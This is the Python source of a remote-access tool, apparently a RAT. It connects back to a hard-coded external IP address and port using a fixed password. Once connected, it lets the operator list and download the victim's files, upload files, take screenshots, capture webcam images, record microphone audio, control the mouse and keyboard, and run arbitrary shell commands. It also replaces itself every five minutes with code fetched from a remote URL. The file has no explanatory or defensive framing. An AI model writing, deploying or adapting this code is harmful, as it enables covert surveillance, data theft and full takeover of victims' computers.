import socket
import struct
import subprocess
import os
import time
import sys
from io import BytesIO
from PIL import ImageGrab
import pyautogui
import threading
import platform
import psutil
import sounddevice as sd
from scipy.io.wavfile import write
import numpy as np
import cv2
import shutil
import logging
import requests
from typing import Optional

# Configure logging to console only
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)

class RemoteClient:
    SERVER_HOST = '176.106.246.150'
    SERVER_PORT = 25565
    PASSWORD = 'StrongPassword123'
    UPDATE_URL = 'https://raw.githubusercontent.com/Dimonlomon/Private/main/client.py'
    CHECK_INTERVAL = 300  # Interval in seconds for checking updates

    def __init__(self):
        self.sock = None
        self.stop_event = threading.Event()

    def send_data(self, data: bytes) -> bool:
        try:
            self.sock.sendall(struct.pack('>I', len(data)))
            self.sock.sendall(data)
            return True
        except (socket.error, struct.error) as e:
            logging.error(f"Send data error: {e}")
            return False

    def recv_data(self) -> Optional[bytes]:
        try:
            raw_len = self.sock.recv(4)
            if not raw_len:
                return None
            length = struct.unpack('>I', raw_len)[0]
            data = b''
            while len(data) < length:
                packet = self.sock.recv(length - len(data))
                if not packet:
                    return None
                data += packet
            return data
        except (socket.error, struct.error) as e:
            logging.error(f"Receive data error: {e}")
            return None

    def auto_update(self):
        while not self.stop_event.is_set():
            try:
                # Fetch remote code from GitHub
                r = requests.get(self.UPDATE_URL, timeout=10)
                if r.status_code != 200:
                    logging.error(f"Failed to fetch update: HTTP {r.status_code}")
                    self.stop_event.wait(self.CHECK_INTERVAL)
                    continue

                remote_code = r.text
                local_path = os.path.realpath(__file__)
                with open(local_path, 'r', encoding='utf-8') as f:
                    local_code = f.read()

                if remote_code != local_code:
                    # Create temporary file in the same directory as client.py
                    temp_file_path = os.path.join(os.path.dirname(local_path), 'temp_client.py')
                    try:
                        with open(temp_file_path, 'w', encoding='utf-8') as temp_file:
                            temp_file.write(remote_code)

                        # Move the temporary file to replace the current script
                        shutil.move(temp_file_path, local_path)
                        logging.info("Client updated successfully. Update will apply on next restart.")
                    except Exception as e:
                        logging.error(f"Update failed: {e}")
                        try:
                            if os.path.exists(temp_file_path):
                                os.unlink(temp_file_path)  # Clean up temp file
                        except:
                            pass
                    finally:
                        # Ensure temp file is deleted even if move fails
                        try:
                            if os.path.exists(temp_file_path):
                                os.unlink(temp_file_path)
                        except:
                            pass
                else:
                    logging.info("No updates available")
            except Exception as e:
                logging.error(f"Update check failed: {e}")
            self.stop_event.wait(self.CHECK_INTERVAL)

    def handle_connection(self):
        try:
            self.sock.settimeout(30.0)
            if not self.send_data(b'PASSWORD:'):
                return
            received = self.recv_data()
            if not received:
                return
            if received.decode() != self.PASSWORD:
                self.send_data(b'ACCESS DENIED')
                return
            self.send_data(b'ACCESS GRANTED')

            while not self.stop_event.is_set():
                cmd = self.recv_data()
                if not cmd:
                    break
                cmd_str = cmd.decode()
                if cmd_str.lower() in ('exit', 'quit'):
                    break
                parts = cmd_str.split()
                action = parts[0].lower()

                if action == 'ls':
                    path = ' '.join(parts[1:]) or '.'
                    try:
                        files = os.listdir(path)
                        self.send_data('\n'.join(files).encode())
                    except Exception as e:
                        self.send_data(f'ERROR: {e}'.encode())

                elif action == 'screenshot':
                    try:
                        img = ImageGrab.grab()
                        buf = BytesIO()
                        img.save(buf, format='PNG')
                        self.send_data(buf.getvalue())
                    except Exception as e:
                        self.send_data(f'ERROR: {e}'.encode())

                elif action == 'sysinfo':
                    try:
                        info = f"OS: {platform.system()} {platform.release()}\n"
                        info += f"User: {os.getlogin()}\n"
                        info += f"Hostname: {socket.gethostname()}\n"
                        info += f"IP: {socket.gethostbyname(socket.gethostname())}\n"
                        info += f"CPU: {platform.processor()}\n"
                        info += f"RAM: {round(psutil.virtual_memory().total / (1024**3), 2)} GB"
                        self.send_data(info.encode())
                    except Exception as e:
                        self.send_data(f'ERROR: {e}'.encode())

                elif action == 'download':
                    filepath = ' '.join(parts[1:])
                    try:
                        with open(filepath, 'rb') as f:
                            self.send_data(f.read())
                        logging.info(f"File {filepath} sent successfully")
                    except Exception as e:
                        self.send_data(f'ERROR: {e}'.encode())
                        logging.error(f"Failed to send file {filepath}: {e}")

                elif action == 'upload':
                    try:
                        filepath = parts[1]
                        data = self.recv_data()
                        if data:
                            with open(filepath, 'wb') as f:
                                f.write(data)
                            self.send_data(b'OK')
                            logging.info(f"File {filepath} uploaded successfully")
                        else:
                            self.send_data(b'ERROR: No data received')
                    except Exception as e:
                        self.send_data(f'ERROR: {e}'.encode())
                        logging.error(f"Failed to upload file {filepath}: {e}")

                elif action == 'webcam_snap':
                    try:
                        cap = cv2.VideoCapture(0)
                        ret, frame = cap.read()
                        cap.release()
                        if ret:
                            _, buf = cv2.imencode('.png', frame)
                            self.send_data(buf.tobytes())
                            logging.info("Webcam snapshot sent successfully")
                        else:
                            self.send_data(b'ERROR: Failed to capture')
                            logging.error("Failed to capture webcam snapshot")
                    except Exception as e:
                        self.send_data(f'ERROR: {e}'.encode())
                        logging.error(f"Webcam snapshot error: {e}")

                elif action == 'record_audio':
                    try:
                        duration = int(parts[1]) if len(parts) > 1 else 5
                        fs = 44100
                        recording = sd.rec(int(duration * fs), samplerate=fs, channels=1)
                        sd.wait()
                        temp = BytesIO()
                        write(temp, fs, recording)
                        temp.seek(0)
                        self.send_data(temp.read())
                        logging.info(f"Audio recorded for {duration} seconds")
                    except Exception as e:
                        self.send_data(f'ERROR: {e}'.encode())
                        logging.error(f"Audio recording error: {e}")

                elif action == 'mouse_move':
                    try:
                        x, y = map(int, parts[1:3])
                        pyautogui.moveTo(x, y)
                        self.send_data(b'OK')
                        logging.info(f"Mouse moved to ({x}, {y})")
                    except Exception as e:
                        self.send_data(f'ERROR: {e}'.encode())
                        logging.error(f"Mouse move error: {e}")

                elif action == 'mouse_click':
                    try:
                        button = parts[1] if len(parts) > 1 else 'left'
                        clicks = int(parts[2]) if len(parts) > 2 else 1
                        pyautogui.click(button=button, clicks=clicks)
                        self.send_data(b'OK')
                        logging.info(f"Mouse clicked: {button}, {clicks} times")
                    except Exception as e:
                        self.send_data(f'ERROR: {e}'.encode())
                        logging.error(f"Mouse click error: {e}")

                elif action == 'key_press':
                    try:
                        pyautogui.press(parts[1])
                        self.send_data(b'OK')
                        logging.info(f"Key pressed: {parts[1]}")
                    except Exception as e:
                        self.send_data(f'ERROR: {e}'.encode())
                        logging.error(f"Key press error: {e}")

                elif action == 'key_write':
                    try:
                        text = cmd_str[len('key_write'):].strip()
                        pyautogui.write(text)
                        self.send_data(b'OK')
                        logging.info(f"Text written: {text}")
                    except Exception as e:
                        self.send_data(f'ERROR: {e}'.encode())
                        logging.error(f"Key write error: {e}")

                else:
                    try:
                        out = subprocess.check_output(cmd_str, shell=True, stderr=subprocess.STDOUT)
                        self.send_data(out)
                        logging.info(f"Command executed: {cmd_str}")
                    except subprocess.CalledProcessError as e:
                        self.send_data(e.output)
                        logging.error(f"Command error: {e}")

        except Exception as e:
            logging.error(f"Connection error: {e}")
        finally:
            if self.sock:
                try:
                    self.sock.close()
                except:
                    pass
            logging.info("Connection closed")

    def connect(self):
        threading.Thread(target=self.auto_update, daemon=True).start()
        while not self.stop_event.is_set():
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.settimeout(30.0)
                self.sock.connect((self.SERVER_HOST, self.SERVER_PORT))
                logging.info(f"Connected to {self.SERVER_HOST}:{self.SERVER_PORT}")
                self.handle_connection()
            except Exception as e:
                logging.error(f"Connection failed: {e}")
                time.sleep(10)
            finally:
                if self.sock:
                    try:
                        self.sock.close()
                    except:
                        pass

    def cleanup(self):
        self.stop_event.set()
        if self.sock:
            try:
                self.sock.close()
            except:
                pass
        logging.info("Client cleanup completed")

if __name__ == '__main__':
    client = RemoteClient()
    try:
        client.connect()
    except KeyboardInterrupt:
        client.cleanup()
